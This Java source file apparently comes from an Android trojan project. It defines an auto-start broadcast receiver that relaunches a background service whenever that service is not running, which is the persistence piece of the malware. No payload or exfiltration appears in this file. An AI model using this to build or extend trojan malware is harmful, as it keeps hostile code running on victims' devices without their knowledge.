package trojan.android.android_trojan.Action.BroadcastReceiver;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import trojan.android.android_trojan.Action.Service.BackgroundService;


public class BackgroundStartReceiver extends BroadcastReceiver {
    private static final String TAG = "AutoStart";

    public void onReceive(Context context, Intent intent)
    {
        if (!isMyServiceRunning(BackgroundService.class, context)){
            //Toast.makeText(context, TAG + "Service not launch", Toast.LENGTH_LONG).show();
            context.startService(new Intent(context, BackgroundService.class));
            Log.d(TAG, "Service not launch");
        }else if (isMyServiceRunning(BackgroundService.class, context)){
            Log.d(TAG, "Service already launch");
            //Toast.makeText(context, TAG + "Service already launch", Toast.LENGTH_LONG).show();
        }
    }

    private boolean isMyServiceRunning(Class<?> serviceClass, Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
